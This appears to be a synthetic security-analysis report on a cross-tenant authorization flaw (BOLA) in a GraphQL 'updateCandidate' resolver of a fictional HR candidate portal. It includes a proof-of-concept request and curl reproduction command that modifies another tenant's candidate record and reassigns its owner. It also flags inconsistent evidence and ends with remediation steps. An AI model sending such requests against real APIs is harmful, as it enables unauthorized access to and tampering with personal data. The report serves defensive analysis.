# Security Analysis Report
**System:** JobCore Candidate Portal
**Domain:** HR Tech / Talent Acquisition
**Example ID:** GQL-0309
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.1 | ID in path without ownership check on `updateCandidate` — attacker modifies and reads cross-tenant candidate profiles without ownership verification |

---

## Finding 1 — BOLA: ID Without Ownership Check on Candidate Object (Pattern 1.1)

### Summary
The `updateCandidate` resolver on JobCore Candidate Portal (`api.jobcore-candidate-po.example.com`) accepts a candidate `id` parameter without verifying the fetched object's `tenantId` against the JWT's `tenantId` (RISK-GQL-309). Per §5.0 Pattern 1.1, the attacker supplies any `candidateId` value — without any ownership check — using a token for `tenant-de5d` to access and modify candidate profiles belonging to `tenant-fa89`. The `ownerId` field is also accepted from client input, enabling unauthorized ownership reassignment.

**Context.txt inconsistency (documented):** HAR mutation uses `updateCandidate(id: "C-2309", input: {status: "approved", ownerId: "attacker-de5dfa89"})`, but the response key in §6.0 is `getCandidate`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`updateCandidate`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `candidateId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of candidate PII data.

**Pattern:** 1.1 — ID in path without ownership check (BOLA)
**Affected resolver:** `updateCandidate`
**Affected endpoint:** `POST https://api.jobcore-candidate-po.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.jobcore-candidate-po.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-de5d

{"query": "query VulnerableOp { updateCandidate(id: \"C-2309\", input: {status: \"approved\", ownerId: \"attacker-de5dfa89\"}) { candidateId status } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Candidate Profile Returned (cross-tenant)**
```json
{
  "data": {
    "getCandidate": {
      "tenantId": "tenant-fa89",
      "ownerId": "other-user-de5dfa89",
      "data": {
        "sensitiveField": "CONFIDENTIAL-de5dfa89",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-de5d`. Returned/mutated data belongs to: `tenant-fa89`. Cross-tenant candidate profile access and modification confirmed.

**Context.txt inconsistency:** HAR sends `updateCandidate` mutation; response body uses key `getCandidate`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.jobcore-candidate-po.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-de5d" \
  -d '{"query": "query VulnerableOp { updateCandidate(id: \"C-2309\", input: {status: \"approved\", ownerId: \"attacker-de5dfa89\"}) { candidateId status } }"}'
# Vulnerable: response contains tenant-fa89 candidate data — cross-tenant mutation succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `updateCandidate` resolver: before mutation, assert `fetched.tenantId === jwt.tenantId`. Return 403 on mismatch.
2. Reject client-supplied `ownerId` in mutation input; derive from JWT `sub`.
3. In `getCandidate` resolver: assert `fetched.tenantId === jwt.tenantId` post-fetch.
4. Re-key Redis cache to include `tenantId`.
